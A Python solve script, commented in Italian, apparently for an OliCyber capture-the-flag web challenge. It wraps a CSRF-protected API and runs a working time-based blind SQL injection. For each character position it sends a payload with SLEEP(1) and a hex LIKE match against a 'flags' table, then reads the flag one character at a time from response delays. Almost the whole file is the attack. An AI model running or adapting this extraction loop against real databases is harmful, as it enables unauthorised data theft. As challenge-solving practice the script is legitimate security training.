import requests
import binascii
from time import time


class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    



inj = Inj('http://web-17.challs.olicyber.it')

flag = ""
# Ipotizziamo una flag lunga massimo 30 caratteri
for pos in range(1, 31):
    char_found = False
    
    # Range dei caratteri stampabili standard (da 32 a 126)
    for char_val in range(32, 127):
        
        # 1. COSTRUISCI IL PAYLOAD
        # Nota: devi capire come "evadere" la query originale del sito 
        # (es. aggiungendo un apice ' o chiudendo una parentesi) 
        hexGuess = flag + chr(char_val)
        hexGuess = hexGuess.encode().hex()

        payload = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{hexGuess}%')='1"        
        # Se i dati si passano in GET (ad esempio nel parametro 'id')
        data = {'query': payload}
        
        # 2. INVIA LA RICHIESTA E MISURA
        try:
            # timeout=delay*2 per evitare che lo script si blocchi se il server è lento di suo
            start = time()

            inj.time(payload)
            

            # Se la richiesta ci mette più del nostro delay, abbiamo fatto centro
            if time() - start >= 1:
                flag += chr(char_val)
                print(f"Trovato: {flag}")
                char_found = True
                break # Passa al carattere successivo
                
        except requests.exceptions.ReadTimeout:
            # Anche un timeout significa che lo sleep ha funzionato!
            flag += chr(char_val)
            print(f"Trovato (da Timeout): {flag}")
            char_found = True
            break

    # Se non trova nessun carattere per una posizione, probabilmente la stringa è finita
    if not char_found:
        print("Estrazione terminata.")
        break

print(f"Flag finale: {flag}")